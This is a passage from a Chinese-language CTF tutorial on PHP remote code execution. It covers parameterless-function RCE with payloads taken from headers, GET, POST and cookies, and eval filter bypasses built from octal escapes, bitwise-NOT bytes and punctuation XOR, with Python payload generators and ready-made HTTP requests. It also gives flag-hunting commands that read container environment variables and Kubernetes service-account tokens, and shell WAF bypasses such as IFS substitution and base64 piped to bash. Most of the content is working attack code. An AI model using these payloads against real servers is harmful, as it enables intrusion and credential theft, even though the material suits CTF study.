5. `array_slice()` 需要数字和逗号，如果题目过滤数字或逗号，这类定位 payload 不适合。
6. `chdir(dirname(getcwd()));...` 需要源码允许多条语句。
7. `readfile(current(array_reverse(scandir(dirname(getcwd())))))` 通常不行，因为它只取到了上级目录里的文件名，没有带上上级目录路径。
8. 随机读取不稳定，可能读到 `.`、`..` 或无关文件，只适合目录文件少的时候碰运气。

### 1.4.6 查看环境信息

```php
phpinfo();
print_r(getenv());
print_r(get_included_files());
print_r(ini_get_all());
```

**可替换点：**

1. `print_r()` 可以换成 `var_dump()` 或 `var_export()`。

**注意点：**

1. `phpinfo()` 适合看路径、禁用函数、`open_basedir`。
2. `getenv()` 可以尝试读环境变量里的 flag。
3. `get_included_files()` 可以看当前脚本包含过哪些文件。
4. `ini_get_all()` 可以看 PHP 配置项。

### 1.4.7 外部变量注入 RCE

这类方法不是从目录里找文件，而是把恶意内容放在 HTTP 请求里，再通过无参数函数从 Header、GET、POST、Cookie 等位置取出来执行。

1. **先查看外部变量结构**

   利用前建议先把能取到的内容打印出来，确认目标值到底在哪个位置。

   ```php
   // 先看 Header 顺序
   print_r(getallheaders());

   // 先看 GET、POST、Cookie 等变量顺序
   print_r(get_defined_vars());
   ```

2. **从 Header 里取值**

   ```php
   // 系统命令放 getallheaders() 输出的最后一位 Header 值里
   system(current(array_reverse(getallheaders())));
   system(pos(array_reverse(getallheaders())));
   system(end(getallheaders()));

   // 系统命令放 getallheaders() 输出的第 2 位 Header 值里
   system(next(getallheaders()));

   // PHP 代码放 getallheaders() 输出的最后一位 Header 值里
   eval(current(array_reverse(getallheaders())));
   eval(pos(array_reverse(getallheaders())));
   eval(end(getallheaders()));

   // PHP 代码放 getallheaders() 输出的第 2 位 Header 值里
   eval(next(getallheaders()));
   ```

   `next(getallheaders())` 示例，恶意内容要放到 Header 的第 2 位：

   ```http
   GET /?code=eval(next(getallheaders())); HTTP/1.1
   Host: target.com
   Cmd: system('cat /flag');
   ```

   `end(getallheaders())` 示例，恶意内容要放到 Header 的最后一位：

   ```http
   GET /?code=eval(end(getallheaders())); HTTP/1.1
   Host: target.com
   User-Agent: test
   X-Test: test
   Cmd: system('cat /flag');
   ```

   `pos(array_reverse(getallheaders()))` 示例，恶意内容也要放到 Header 的最后一位：

   ```http
   GET /?code=eval(pos(array_reverse(getallheaders()))); HTTP/1.1
   Host: target.com
   User-Agent: test
   Cmd: system('cat /flag');
   ```

3. **从 GET 参数里取值**

   ```php
   // 系统命令放 current(get_defined_vars()) 取到的数组的第 2 个值里，常见是第 2 个 GET 参数
   system(next(current(get_defined_vars())));

   // 系统命令放 current(get_defined_vars()) 取到的数组的最后一位值里，常见是最后一个 GET 参数
   system(end(current(get_defined_vars())));
   system(pos(array_reverse(current(get_defined_vars()))));

   // PHP 代码放 current(get_defined_vars()) 取到的数组的第 2 个值里，常见是第 2 个 GET 参数
   eval(next(current(get_defined_vars())));

   // PHP 代码放 current(get_defined_vars()) 取到的数组的最后一位值里，常见是最后一个 GET 参数
   eval(end(current(get_defined_vars())));
   eval(pos(array_reverse(current(get_defined_vars()))));
   ```

   第 2 个 GET 参数示例：

   ```http
   GET /?code=eval(next(current(get_defined_vars())));&a=system('cat /flag'); HTTP/1.1
   Host: target.com
   ```

   最后一个 GET 参数示例：

   ```http
   GET /?code=eval(end(current(get_defined_vars())));&a=test&b=system('cat /flag'); HTTP/1.1
   Host: target.com
   ```

4. **从 POST 参数里取值**

   ```php
   // 系统命令放 next(get_defined_vars()) 取到的数组的最后一位值里，常见是最后一个 POST 参数
   system(end(next(get_defined_vars())));
   system(array_pop(next(get_defined_vars())));
   system(pos(array_reverse(next(get_defined_vars()))));

   // PHP 代码放 next(get_defined_vars()) 取到的数组的最后一位值里，常见是最后一个 POST 参数
   eval(end(next(get_defined_vars())));
   eval(array_pop(next(get_defined_vars())));
   eval(pos(array_reverse(next(get_defined_vars()))));
   ```

   最后一个 POST 参数示例：

   ```http
   POST /?code=eval(array_pop(next(get_defined_vars()))); HTTP/1.1
   Host: target.com
   Content-Type: application/x-www-form-urlencoded

   a=test&b=system('cat /flag');
   ```

5. **从 Cookie / Session ID 里取值**

   如果题目开启了 Session，可以尝试把简单命令放到 `PHPSESSID` 里。

   ```php
   // 系统命令放 PHPSESSID 里
   system(session_id());
   
   // PHP 代码放 PHPSESSID 里
   eval(session_id());
   ```

   请求示例：

   ```http
   GET /?code=system(session_id()); HTTP/1.1
   Host: target.com
   Cookie: PHPSESSID=id
   ```

**可替换点：**

1. `system()` 可以换成其他可用命令执行函数。
2. `eval()` 用来执行 PHP 代码，请求里携带的内容要是合法 PHP 语句。
3. `current()` 和 `pos()` 作用类似，都可以取数组当前元素。
4. 如果正向不好取，可以加 `array_reverse()` 反过来取。
5. `end()`、`next()`、`array_pop()` 取的位置不同，恶意内容要放到对应位置。

**注意点：**

1. `getallheaders()`、`get_defined_vars()` 的顺序不一定固定，利用前最好先打印结构。
2. `next()` 取第 2 位，`end()` 取最后一位，`current(array_reverse(...))` 和 `pos(array_reverse(...))` 也是取反转后的第 1 位，也就是原数组最后一位。
3. `current(get_defined_vars())`、`next(get_defined_vars())` 分别取到哪个数组，要看实际环境，不要硬背。
4. 外层是 `system()` 时，外部变量里放系统命令；外层是 `eval()` 时，外部变量里放 PHP 代码。
5. `eval()` 里的内容建议带分号，例如 `system('cat /flag');`。
6. `session_id()` 依赖题目是否开启 Session，没开 Session 时不一定能用。

### 1.4.8 函数速查表

| 功能          | 函数                                                         | 说明                                                 |
| ------------- | ------------------------------------------------------------ | ---------------------------------------------------- |
| 当前目录参数  | `getcwd()`、`current(localeconv())`、`pos(localeconv())`、`chr(46)` | 用作 `scandir()` 的当前目录参数                      |
| 点号相关      | `chr(46)`                                                    | ASCII 构造点号，数字被过滤时不能用                   |
|               | `phpversion()`                                               | 返回版本号，里面通常有点号，需要配合取字符           |
|               | `spl_autoload_extensions()`                                  | 返回扩展名列表，常见包含 `.inc,.php`，需要配合取字符 |
| 目录 / 状态   | `scandir()`                                                  | 扫目录                                               |
|               | `dirname()`                                                  | 获取上级目录                                         |
|               | `chdir()`                                                    | 改变当前工作目录                                     |
| 数组 / 字符串 | `current()`、`pos()`、`end()`                                | 指针定位                                             |
|               | `next()`、`prev()`、`reset()`                                | 指针移动                                             |
|               | `array_reverse()`                                            | 数组倒序                                             |
|               | `array_slice()`                                              | 截取数组                                             |
|               | `array_flip()`、`array_rand()`                               | 随机定位                                             |
|               | `array_pop()`                                                | 弹出数组最后一位，更多用于变量场景                   |
|               | `strrev()`                                                   | 字符串反转                                           |
| 文件读取      | `readfile()`                                                 | 输出文件内容                                         |
|               | `show_source()`、`highlight_file()`                          | 高亮读取 PHP 源码                                    |
|               | `file_get_contents()`                                        | 读取为字符串，通常还要配合输出函数                   |
|               | `file()`                                                     | 读取文件为数组，通常还要配合输出函数                 |
|               | `readgzfile()`                                               | 主要用于 gzip 文件，普通文本优先 `readfile()`        |
| 输出 / 执行   | `print_r()`、`var_dump()`                                    | 输出数组结果                                         |
|               | `var_export()`                                               | 输出变量的 PHP 表示形式                              |
|               | `system()`                                                   | 命令执行                                             |
|               | `eval()`                                                     | 代码执行，语言结构，不能动态函数调用                 |
| 请求上下文    | `getallheaders()`                                            | 获取请求头                                           |
|               | `get_defined_vars()`                                         | 获取当前作用域变量                                   |
|               | `session_id()`                                               | 获取 Session ID                                      |
| 环境信息      | `phpinfo()`                                                  | 查看 PHP 环境和限制                                  |
|               | `getenv()`                                                   | 读取环境变量                                         |
|               | `get_included_files()`                                       | 查看已包含文件                                       |
|               | `ini_get_all()`                                              | 查看 PHP 配置项                                      |

## 1.5 无字母数字 RCE

无字母数字 RCE 一般不是指一个固定漏洞，而是指题目已经存在 `eval()`、命令执行函数或其他代码执行入口，但是又用正则限制了输入字符。

常见限制可以分成三类：

| 限制类型   | 常见正则              | 核心思路                                           |
| ---------- | --------------------- | -------------------------------------------------- |
| 无字母     | `/[a-z]/i`            | 用八进制转义、按位运算等方式在运行时还原字符串     |
| 无数字     | `/[0-9]/`             | 直接避开数字，或者用布尔值、字符串长度等方式造数字 |
| 无字母数字 | `/[a-z0-9]/i`         | 用非 ASCII 字节取反，或者用纯标点字符串异或        |

做题时要先确认过滤的是哪一层：

1. 如果后端是 `system($input)`，过滤的是 Shell 命令，重点考虑命令替代、通配符、环境变量和重定向。
2. 如果后端是 `eval($input)`，过滤的是 PHP 代码，需要先构造函数名和参数，再通过可变函数调用。
3. 如果过滤发生在 URL 解码前，`%xx` 编码中的字母和数字也可能被看到。
4. 如果过滤发生在 `$_GET`、`$_POST` 取值之后，百分号编码通常已经被 PHP 解码，正则检查的是解码后的字节。
5. 如果题目使用 JSON，请求体是否会进行 URL 解码要看后端代码，不能直接照搬 GET 参数的写法。

下面主要以 PHP 的 `eval()` 场景举例。

### 1.5.1 无字母 RCE

无字母 RCE 常见于后端禁止大小写英文字母，但是仍然允许数字、反斜杠、引号、美元符号和其他标点的情况。

典型源码：

```php
<?php
$code = $_GET['code'] ?? '';

if (preg_match('/[a-z]/i', $code)) {
    die('letters are not allowed');
}

eval($code);
```

普通 payload：

```php
system('cat /flag');
```

里面包含 `system`、`cat` 和 `flag` 等字母，会直接被正则拦截。

无字母 RCE 的核心思路是：提交的 PHP 代码里不直接出现字母，让 PHP 在运行时把数字和标点还原成函数名与参数。

1. **使用八进制转义构造字符串**

   PHP 双引号字符串支持 `\数字` 形式的八进制字节转义，每个字节最多使用 3 位八进制数字。

   例如：

   ```php
   "\163\171\163\164\145\155"
   ```

   PHP 解析后得到：

   ```txt
   system
   ```

   `system` 的每个字符对应关系：

   | 字符 | ASCII 十进制 | 八进制 |
   | ---- | ------------ | ------ |
   | `s`  | 115          | `163`  |
   | `y`  | 121          | `171`  |
   | `s`  | 115          | `163`  |
   | `t`  | 116          | `164`  |
   | `e`  | 101          | `145`  |
   | `m`  | 109          | `155`  |

   同理：

   ```php
   "\143\141\164\040\057\146\154\141\147"
   ```

   PHP 解析后得到：

   ```txt
   cat /flag
   ```

   其中 `\040` 是空格，`\057` 是 `/`。

2. **使用可变函数执行命令**

   PHP 允许把函数名放进变量，再通过变量名后面的括号调用函数。

   正常写法：

   ```php
   $func = 'system';
   $arg = 'cat /flag';
   $func($arg);
   ```

   去掉所有字母后，可以写成：

   ```php
   $_="\163\171\163\164\145\155";$__="\143\141\164\040\057\146\154\141\147";$_($__);
   ```

   执行过程：

   1. `$_` 被还原成字符串 `system`。
   2. `$__` 被还原成字符串 `cat /flag`。
   3. `$_($__)` 相当于 `system('cat /flag')`。

   整个 payload 只包含数字和标点，不包含英文字母，因此可以通过 `/[a-z]/i` 检查。

3. **不经过 Shell，直接读取文件**

   如果 `system()` 被 `disable_functions` 禁用，或者环境里没有 `cat`，可以优先尝试构造 `readfile()`。

   `readfile` 的八进制形式：

   ```php
   "\162\145\141\144\146\151\154\145"
   ```

   `/flag` 的八进制形式：

   ```php
   "\057\146\154\141\147"
   ```

   完整 payload：

   ```php
   $_="\162\145\141\144\146\151\154\145";$_("\057\146\154\141\147");
   ```

   还原后相当于：

   ```php
   readfile('/flag');
   ```

   这种方式不启动 Shell，只要 PHP 进程本身有权限读取文件即可。

4. **八进制 Payload 生成脚本**

   手工转换容易写错，可以使用 Python 生成。

   ```python
   def php_octal(text):
       return ''.join(f'\\{byte:03o}' for byte in text.encode())


   function_name = php_octal('system')
   command = php_octal('cat /flag')

   payload = f'$_="{function_name}";$__="{command}";$_($__);'

   print('函数名：', function_name)
   print('命令：', command)
   print('Payload：', payload)
   ```

   输出：

   ```txt
   函数名： \163\171\163\164\145\155
   命令： \143\141\164\040\057\146\154\141\147
   Payload： $_="\163\171\163\164\145\155";$__="\143\141\164\040\057\146\154\141\147";$_($__);
   ```

5. **使用按位取反构造字符串**

   PHP 对字符串使用 `~` 时，会对字符串中每个字节进行按位取反，结果仍然是字符串。

   例如，字母 `s` 的字节是 `0x73`，按位取反后是 `0x8c`：

   ```txt
   0x73 ^ 0xff = 0x8c
   0x8c ^ 0xff = 0x73
   ```

   所以把 `system` 每个字节取反后的二进制数据交给 PHP，再执行一次 `~`，就能还原出 `system`。

   这种方式不依赖数字，但请求中会出现不可打印字节，更适合放在无字母数字场景中使用。

6. **完整利用流程**

   遇到无字母限制时，可以按下面的顺序处理：

   1. 查看源码，确认是 `eval()`、`assert()` 还是命令执行函数。
   2. 确认正则是否带 `i`，是否同时过滤大写和小写。
   3. 先用只包含数字和运算符的表达式测试代码是否执行，例如 `$_=1+1;`。
   4. 如果数字可用，优先使用八进制双引号字符串构造函数名。
   5. 先尝试 `readfile('/flag')` 这类不依赖 Shell 的文件读取。
   6. 需要执行命令时，再构造 `system('cat /flag')`。
   7. 没有回显时，结合前面的无回显 RCE 方法，尝试写文件、HTTP 外带或时间延迟。

7. **常见注意点**

   1. 八进制转义只会在 PHP 双引号字符串和 Heredoc 中展开，单引号字符串不会把 `\163` 解析成 `s`。
   2. 八进制转义最多读取 3 位八进制数字，建议每个字节固定写成 3 位。
   3. `eval()` 接收的是 PHP 代码片段，通常不需要写 `<?php`。
   4. 可变函数只能调用真正的函数，不能直接调用 `echo`、`print`、`eval`、`include` 等语言结构。
   5. `system()` 能否使用要看 `disable_functions`、系统环境和进程权限。
   6. 如果反斜杠或双引号也被过滤，八进制字符串会失效，需要改用按位运算或外部变量注入。
   7. 不能只检查 payload 表面是否没有字母，还要确认后端正则检查的是 URL 解码前还是解码后的内容。

### 1.5.2 无数字 RCE

无数字 RCE 指输入中不能出现 `0-9`，但是字母和常见标点仍然可以使用。

典型源码：

```php
<?php
$code = $_GET['code'] ?? '';

if (preg_match('/[0-9]/', $code)) {
    die('digits are not allowed');
}

eval($code);
```

无数字限制通常比无字母限制简单，因为很多 PHP 函数名、Shell 命令和 flag 路径本身就不包含数字。

1. **先检查是否根本不需要数字**

   下面的 payload 本身不包含数字：

   ```php
   system('cat /flag');
   ```

   如果后端只过滤 `/[0-9]/`，这条 payload 可以直接通过。

   不经过 Shell 的写法：

   ```php
   readfile('/flag');
   ```

   因此遇到无数字题目时，不要一上来就研究复杂构造，先检查目标函数、命令和路径是否真的需要数字。

2. **使用布尔值构造数字**

   PHP 在算术运算中会把 `true` 转换成整数 `1`，把 `false` 转换成整数 `0`。

   ```php
   true+true
   ```

   结果是：

   ```txt
   2
   ```

   常见构造：

   | 目标数字 | 无数字写法                     |
   | -------- | ------------------------------ |
   | `0`      | `false`                        |
   | `1`      | `true`                         |
   | `2`      | `true+true`                    |
   | `3`      | `true+true+true`               |
   | `5`      | `true+true+true+true+true`     |

   例如想调用 `sleep(5)`，可以写成：

   ```php
   sleep(true+true+true+true+true);
   ```

   payload 中没有数字，但运行时传给 `sleep()` 的参数是 `5`。

3. **使用字符串长度构造数字**

   `strlen()` 会返回字符串长度。

   ```php
   strlen('.')
   ```

   结果是 `1`。

   构造 `5`：

   ```php
   $_=strlen('.');$_+$_+$_+$_+$_
   ```

   用于时间延迟：

   ```php
   $_=strlen('.');sleep($_+$_+$_+$_+$_);
   ```

   这种写法比连续写很多个 `true` 更方便修改。

4. **避免使用数字下标**

   如果原思路需要：

   ```php
   $array[0]
   $array[1]
   ```

   可以根据实际目标改用数组指针函数：

   | 作用       | 无数字写法              |
   | ---------- | ----------------------- |
   | 第一个元素 | `current($array)`       |
   | 第二个元素 | `next($array)`          |
   | 最后一个   | `end($array)`           |
   | 弹出第一个 | `array_shift($array)`   |
   | 弹出最后一个 | `array_pop($array)`   |

   这些函数的具体行为和前面的无参数 RCE 一样，使用前要先确认数组顺序。

5. **使用通配符代替路径中的数字**

   假设 flag 文件名是：

   ```txt
   /flag1.txt
   ```

   直接写文件名会出现数字 `1`，可以尝试 Shell 通配符：

   ```php
   system('cat /flag?.txt');
   ```

   或者：

   ```php
   system('cat /flag*');
   ```

   `?` 匹配一个字符，`*` 匹配任意数量字符。

   **注意：** 如果通配符匹配到多个文件，输出可能混在一起，命令行为也可能和预期不同。

6. **无数字表达式生成脚本**

   少量数字可以直接用 `strlen('.')` 相加生成。

   ```python
   def digitless_number(number):
       if number < 0:
           raise ValueError('这里只生成非负整数')
       if number == 0:
           return 'false'
       return '+'.join(['strlen(".")'] * number)


   value = digitless_number(5)
   print(value)
   print(f'sleep({value});')
   ```

   输出：

   ```txt
   strlen(".")+strlen(".")+strlen(".")+strlen(".")+strlen(".")
   sleep(strlen(".")+strlen(".")+strlen(".")+strlen(".")+strlen("."));
   ```

   这种方法适合构造较小的数字。数字很大时，应该结合加法、乘法和已有返回值缩短表达式，而不是机械重复几百次。

7. **完整例题**

   源码：

   ```php
   <?php
   highlight_file(__FILE__);

   $code = $_GET['code'] ?? '';

   if (preg_match('/[0-9]/', $code)) {
       die('no digits');
   }

   eval($code);
   ```

   第一步，直接读取 flag：

   ```php
   readfile('/flag');
   ```

   如果题目无回显，可以先测试时间延迟：

   ```php
   sleep(true+true+true+true+true);
   ```

   如果延迟约 5 秒，说明代码已经执行，再切换到写文件或外带数据的方法。

8. **常见注意点**

   1. 先看函数名、命令和路径是否已经不含数字，很多题目不需要额外构造。
   2. `true` 和 `false` 是 PHP 关键字，只适用于字母仍然允许的情况。
   3. 通配符由 Shell 展开，`readfile('/flag?')` 不会像 Shell 一样自动展开 `?`。
   4. `strlen('.')` 返回的是整数 `1`，但字符串内容可以换成任意一个允许字符。
   5. 数字过滤可能只针对参数，也可能连 URL 路径、Cookie 和请求头一起检查，需要根据源码确认。
   6. 如果同时过滤了字母，就不能继续使用 `true`、`strlen`、`system`，要进入无字母数字构造。

### 1.5.3 无字母数字 RCE

无字母数字 RCE 常见于后端同时禁止英文字母和数字，只允许美元符号、下划线、引号、括号、运算符等标点的场景。

典型源码：

```php
<?php
$code = $_GET['code'] ?? '';

if (preg_match('/[a-z0-9]/i', $code)) {
    die('letters and digits are not allowed');
}

eval($code);
```

普通的函数名、变量名、命令和八进制转义都不能直接使用，因为它们分别包含字母或数字。

核心思路是：先用允许的标点或非 ASCII 字节生成 `system`、`readfile` 等字符串，再把生成结果当作可变函数调用。

1. **使用非 ASCII 字节按位取反**

   PHP 字符串本质上是字节序列。对字符串使用 `~` 时，PHP 会逐字节取反。

   `system` 对应的字节：

   ```txt
   73 79 73 74 65 6d
   ```

   每个字节和 `ff` 异或后的结果：

   ```txt
   8c 86 8c 8b 9a 92
   ```

   PHP 收到字节 `8c 86 8c 8b 9a 92` 后，对它执行 `~`，就会还原出字符串 `system`。

   `cat /flag` 取反后的字节：

   ```txt
   9c 9e 8b df d0 99 93 9e 98
   ```

2. **构造完整调用**

   解码后的 PHP 代码结构：

   ```php
   $_=~"【system 取反后的原始字节】";$__=~"【cat /flag 取反后的原始字节】";$_($__);
   ```

   这里使用 `$_` 和 `$__` 作为变量名，是因为 PHP 变量名可以以下划线开头，不需要英文字母或数字。

   执行过程：

   1. `~"【字节】"` 还原出 `system`。
   2. 第二个 `~"【字节】"` 还原出 `cat /flag`。
   3. `$_($__)` 调用 `system('cat /flag')`。

3. **生成 URL 编码 Payload**

   不可打印字节不适合直接复制到浏览器地址栏，通常使用百分号编码发送。

   ```python
   from urllib.parse import quote_from_bytes


   def invert_bytes(text):
       return bytes((~byte) & 0xff for byte in text.encode())


   function_name = invert_bytes('system')
   command = invert_bytes('cat /flag')

   payload = (
       b'$_=~"' + function_name +
       b'";$__=~"' + command +
       b'";$_($__);'
   )

   print('函数名字节：', function_name.hex())
   print('命令字节：', command.hex())
   print('URL 编码：', quote_from_bytes(payload, safe=''))
   ```

   输出：

   ```txt
   函数名字节： 8c868c8b9a92
   命令字节： 9c9e8bdfd099939e98
   URL 编码： %24_%3D~%22%8C%86%8C%8B%9A%92%22%3B%24__%3D~%22%9C%9E%8B%DF%D0%99%93%9E%98%22%3B%24_%28%24__%29%3B
   ```

   假设参数名是 `code`，请求可以写成：

   ```http
   GET /?code=%24_%3D~%22%8C%86%8C%8B%9A%92%22%3B%24__%3D~%22%9C%9E%8B%DF%D0%99%93%9E%98%22%3B%24_%28%24__%29%3B HTTP/1.1
   Host: target
   ```

   PHP 解析 `$_GET['code']` 时通常会先进行 URL 解码，所以 `preg_match()` 看到的是美元符号、下划线、标点和高位字节，而不是 `%8C` 这几个可见字符。

4. **改成直接读取文件**

   如果不想依赖 Shell，可以把生成脚本中的：

   ```python
   function_name = invert_bytes('system')
   command = invert_bytes('cat /flag')
   ```

   改成：

   ```python
   function_name = invert_bytes('readfile')
   command = invert_bytes('/flag')
   ```

   生成后的 PHP 逻辑相当于：

   ```php
   readfile('/flag');
   ```

   这种方式不经过 Shell，通常更适合只有文件读取需求的 CTF 题目。

5. **使用纯标点字符串异或**

   PHP 对两个字符串使用 `^` 时，会对相同位置的字节进行异或。

   例如下面两组纯标点字符串异或后会得到 `system`：

   ```php
   "(&()%-"^"[_[]@@"
   ```

   对应关系：

   ```txt
   ( ^ [ = s
   & ^ _ = y
   ( ^ [ = s
   ) ^ ] = t
   % ^ @ = e
   - ^ @ = m
   ```

   `cat` 可以写成：

   ```php
   "#!)"^"@@]"
   ```

   `flag` 可以写成：

   ```php
   "&,!:"^"@@@]"
   ```

   因为 `/` 无法用这组可见标点稳定构造，可以把空格和 `/` 作为允许的字面量拼进去：

   ```php
   $_="(&()%-"^"[_[]@@";$__=("#!)"^"@@]")." /".("&,!:"^"@@@]");$_($__);
   ```

   还原结果：

   ```php
   system('cat /flag');
   ```

   这条 payload 的 PHP 代码部分只包含标点，不依赖高位二进制字节。与按位取反方案相比，它更不容易被 UTF-8 转码破坏，但需要为目标字符串逐字节寻找合适的异或字符对。

6. **按位取反和异或的选择**

   | 方法           | 优点                               | 缺点                                           |
   | -------------- | ---------------------------------- | ---------------------------------------------- |
   | 非 ASCII 取反  | 构造简单，任意字节都可以自动生成   | 可能被代理、字符集转换或 `/u` 正则破坏         |
   | 纯标点异或     | 请求内容可以全部使用可打印字符     | 构造更长，不是每个目标字节都有方便的标点组合   |
   | 外部变量注入   | PHP 主参数可以非常短               | 依赖请求头、Cookie、Session 等可控数据来源      |

7. **URL 编码顺序**

   URL 编码能否绕过，取决于后端处理顺序。

   常见安全边界：

   ```txt
   原始 URL
       ↓
   Web 服务器解析并进行 URL 解码
       ↓
   PHP 生成 $_GET
       ↓
   preg_match() 检查解码后的参数
       ↓
   eval() 执行
   ```

   在这种流程里，`%8C` 会先变成一个字节 `0x8c`，正则不会看到字符 `8`、`C`。

   但是如果 WAF 直接扫描原始 URL，看到的是 `%8C`，其中仍然包含数字和字母，可能会被拦截。

   所以不能简单认为"URL 编码一定能绕过正则"，必须确认过滤发生在哪一层。

8. **完整解题流程**

   1. 查看源码，确定执行入口和正则表达式。
   2. 判断是否过滤大小写字母、数字、下划线、美元符号、引号和反斜杠。
   3. 判断参数来自 GET、POST 表单、JSON、Cookie 还是请求头。
   4. 如果数字允许，优先使用八进制字符串。
   5. 如果字母数字都不允许，优先生成按位取反 Payload。
   6. 如果高位字节被破坏，再尝试纯标点异或。
   7. 优先构造 `readfile('/flag')`，需要更复杂操作时再构造 `system()`。
   8. 没有回显时，结合 DNSLOG、HTTP 外带、写入 Web 目录或时间延迟判断。

9. **常见注意点**

   1. 使用 `%xx` 发送高位字节的前提是后端会先 URL 解码，再执行正则。
   2. JSON 字符串中的 `\uXXXX` 表示 Unicode 字符，不等于任意单字节 `%xx`，不能直接照搬 URL Payload。
   3. 代理、框架和字符集转换可能把 `0x80-0xff` 的字节替换或重新编码。
   4. 正则带 `/u` 时，非法 UTF-8 字节可能让 `preg_match()` 返回 `false`。源码如果严格检查返回值，Payload 会被拒绝；如果错误地把 `false` 当成"未匹配"，还可能形成额外绕过。
   5. PHP 字符串按位运算是逐字节进行的，不是对 Unicode 字符做逻辑运算。
   6. 两个字符串异或时要保证长度和位置对应，否则结果会缺失或错误。
   7. 可变函数不能调用 `eval`、`echo`、`include` 等语言结构。
   8. `system()`、`exec()` 等函数可能被禁用，读取 flag 时优先考虑 `readfile()`、`file_get_contents()` 配合输出函数。
   9. 纯标点 Payload 不是固定答案，过滤字符不同、PHP 版本不同、输入通道不同，最终写法也会变化。

## 1.6 寻找 flag 技巧

### 1.6.1 flag 常见位置（优先级排序）

```bash
# 1. 根目录
cat /flag
cat /flag.txt
cat /flag.php

# 2. 环境变量
env | grep flag
printenv | grep -i flag
cat /proc/1/environ | tr '\0' '\n' | grep flag

# 3. Web 目录
cat /var/www/html/flag
cat /var/www/html/flag.php
cat /app/flag
cat /src/flag

# 4. 用户家目录
cat ~/flag
cat /home/*/flag
cat /root/flag

# 5. 临时目录
cat /tmp/flag*
ls -la /tmp/

# 6. 上级目录
cat ../flag
cat ../../flag
cat ../../../flag
```

### 1.6.2 find 命令（最强大的文件搜索）

```bash
# 全盘搜索
find / -name "flag*" 2>/dev/null
find / -name "*flag*" -type f 2>/dev/null

# 按时间搜索（flag 往往是最近放进来的）
find / -type f -mmin -30 2>/dev/null      # 最近 30 分钟
find / -type f -mtime -1 2>/dev/null      # 最近 1 天
find / -type f -newer /etc/passwd 2>/dev/null  # 比 passwd 新

# 按大小搜索（flag 通常很小）
find / -type f -size +10c -size -500c 2>/dev/null  # 10-500 字节
```

### 1.6.3 grep 递归搜索文件内容

```bash
# 搜包含 "flag{" 的文件
grep -r "flag{" / 2>/dev/null
grep -r "flag{" /var/www/ 2>/dev/null
grep -rl "flag{" / 2>/dev/null          # 只列文件名

# 多格式
grep -rE "flag\{|ctf\{|CTF\{" /var/www/ 2>/dev/null
```

### 1.6.4 快速定位小技巧

```bash
# 列出所有隐藏文件
find / -name ".*" -type f 2>/dev/null
ls -la /          # ls 输出行以权限位开头，不能用 grep '^\.' 判断隐藏文件

# 看最近修改的文件
ls -laRt / | grep -E "^-"
ls -lt /tmp/ | head -20

# 搜日志
cat /var/log/apache2/access.log | grep flag
grep flag /var/log/* 2>/dev/null

# flag 在 PHP 注释里
grep -r "flag" /var/www/html/*.php 2>/dev/null

# flag 在 .env 或配置文件中
cat /var/www/html/.env | grep -i flag
cat /var/www/html/config.php | grep flag
```

### 1.6.5 Docker 容器特色

```bash
# 检查是否在容器中
cat /proc/1/cgroup            # cgroup v2 中不一定出现 docker 字样
ls -la /.dockerenv

# 容器特有位置
cat /flag
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/{namespace,token} 2>/dev/null

# 容器环境变量
env
cat /proc/1/environ | tr '\0' '\n'
```

### 1.6.6 出题人常见套路

| 套路                     | 对策                                           |
| ------------------------ | ---------------------------------------------- |
| flag 文件名随机          | `find / -name "flag*"`                         |
| flag 在环境变量          | `env`、`printenv`                              |
| flag 藏在图片/二进制里   | `strings * \| grep flag`                       |
| flag 分段存放            | `grep -rE "flag\{.+" /`                        |
| flag 需要特殊权限        | `ls -la` 检查权限，考虑提权                    |
| flag 在上级目录          | `cat ../flag`、`find / -maxdepth 3 -name flag` |
| flag 只对特定 IP/UA 可见 | curl 加对应请求头                              |
| flag 在数据库里          | 连数据库 `SELECT * FROM flag;`                 |

### 1.6.7 实战高效流程（从 RCE 到 flag）

```
1. ls /                          → 根目录有没有 flag
2. env                           → 环境变量
3. find / -name "flag*" 2>/dev/null  → 全盘搜索
4. grep -r "flag{" /var/www/ 2>/dev/null  → 搜文件内容
5. cat /proc/1/environ | tr '\0' '\n'  → 容器环境变量
6. 还没有 → 换个位置 → /tmp、/home、/opt、/app 逐个看
```

## 1.7 RCE 常见 WAF 绕过技巧

### 1.7.1 过滤空格

| 绕过方式      | 示例             | 说明                                         |
| ------------- | ---------------- | -------------------------------------------- |
| `${IFS}`      | `cat${IFS}/flag` | Shell 内部字段分隔符（默认=空格+Tab+换行）   |
| `$IFS$9`      | `cat$IFS$9/flag` | 位置参数 `$9` 通常为空，用它明确终止 `$IFS` 的展开 |
| `<` 重定向    | `cat</flag`      | 把文件当标准输入传给 cat                     |
| `<>` 重定向   | `cat<>/flag`     | 以读写方式打开文件，目标不可写时可能失败      |
| `%09` (Tab)   | `cat%09/flag`    | URL 编码的 Tab，Shell 中 Tab 也是空白        |
| `%0a` (换行)  | `cat%0a/flag`    | 换行在 Shell 中也是分隔符                    |
| `{cat,/flag}` | `{cat,/flag}`    | Bash 花括号扩展，逗号替代空格                |
| `$u`          | `cat$u/flag`     | 未定义变量 `$u` 展开为空                     |

**IFS 详解：**

```bash
cat${IFS}/flag      # {} 包裹，稳妥
cat$IFS$9/flag      # $IFS 后接位置参数 $9，变量边界明确
cat$IFS/flag        # / 不属于变量名，Shell 会把它解析为 $IFS 后接 /flag
```

### 1.7.2 过滤关键词

**1. 引号插入**

```bash
c''at /flag          # 空字符串插入
c"a"t /fl""ag        # 双引号同理
c\a\t /f\l\a\g       # 反斜杠转义每个字母
```

**2. 变量拼接**

```bash
a=c;b=at;c=f;d=lag;$a$b /$c$d
a=ca;b=t;c=ag;$a$b /fl$c
```

**3. 特殊变量**

```bash
ca$1t /fl$@ag        # $1 和 $@ 未定义 → 展开为空 → cat /flag
```

**4. Base64 编码**

```bash
echo "Y2F0IC9mbGFn" | base64 -d | bash

# 生成 base64:
echo -n "cat /flag" | base64   # → Y2F0IC9mbGFn
```

**5. Hex 编码**

```bash
echo "636174202f666c6167" | xxd -r -p | bash

# 生成 hex:
echo -n "cat /flag" | xxd -p   # → 636174202f666c6167
```

**6. 八进制表示**

```bash
$'\143\141\164' $'\57\146\154\141\147'          # cat /flag
$(printf "\143\141\164\040\057\146\154\141\147") # 同上
```

**7. PHP 代码执行中函数的替代**

```php
// system() 被过滤时
passthru("cat /flag");
exec("cat /flag", $a); var_dump($a);
shell_exec("cat /flag");
`cat /flag`;
popen("cat /flag", "r");

// eval() 被过滤时
assert("system('cat /flag')");           // PHP < 8；还要求断言未被配置禁用
